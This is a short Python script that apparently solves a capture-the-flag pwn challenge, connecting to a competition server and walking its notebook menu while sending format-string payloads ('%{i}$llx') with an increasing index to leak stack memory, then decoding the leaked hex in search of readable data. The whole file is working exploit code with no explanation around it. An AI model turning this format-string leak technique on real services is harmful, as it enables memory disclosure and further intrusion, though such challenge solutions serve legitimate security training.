import socket
def recv():
    data = b''
    while not data.endswith(b'> '):
        data += sock.recv(1024)
    return data.decode()

def send(data):
    sock.send(bytes(data, 'utf-8'))


sock = socket.socket()
sock.connect(("pwn-notebook.2021.ctfcompetition.com", 1337))

print(recv())

i = 1
while True:
    send("5\n")
    send("0\n")
    send("4\n")
    send(f"%{i}$llx\n")
    send("2\n")
    send("0\n")

    data = recv()
    if "print out" in data:
        try:
            print(b''.fromhex(data.split("< ")[1].split(" >")[0])[::-1])
        except:
            pass

    i += 1
